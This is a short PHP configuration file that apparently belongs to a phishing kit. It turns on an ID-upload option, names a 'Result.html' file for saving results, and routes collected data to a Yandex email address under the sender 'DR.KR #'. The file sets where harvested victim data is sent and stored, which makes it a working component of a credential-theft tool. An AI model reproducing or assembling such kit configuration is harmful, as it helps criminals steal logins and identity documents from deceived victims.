<?php
// to remove ID upload   $id = "0";
$id = "1";
$save = "../../../Result.html"; // file save result
//Your Eamil Here
$to = "grutcem.009@yandex.com";
$from = "DR.KR # <grutcem.009@yandex.com>"; // from mail
?>